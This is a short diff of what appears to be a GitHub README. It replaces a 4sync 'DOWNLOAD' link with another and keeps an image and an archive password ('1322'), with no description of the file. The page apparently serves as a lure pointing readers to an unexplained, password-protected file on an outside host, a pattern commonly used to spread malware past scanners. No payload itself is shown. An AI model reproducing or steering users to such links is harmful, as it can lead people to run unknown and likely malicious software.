@@ -2,7 +2,7 @@
 
 ![505643884-1b6b1b36-9c16-4ba8-90db-d4e5d1b64fb6](https://github.com/user-attachments/assets/97869fe2-df6c-4385-9384-66d1f9e62462)
 
-# [DOWNLOAD](https://www.4sync.com/s/feLmqkiGe)  
+# [DOWNLOAD](https://www.4sync.com/s/feGVfriDg)  
 ## PASSWORD: 1322
 
 
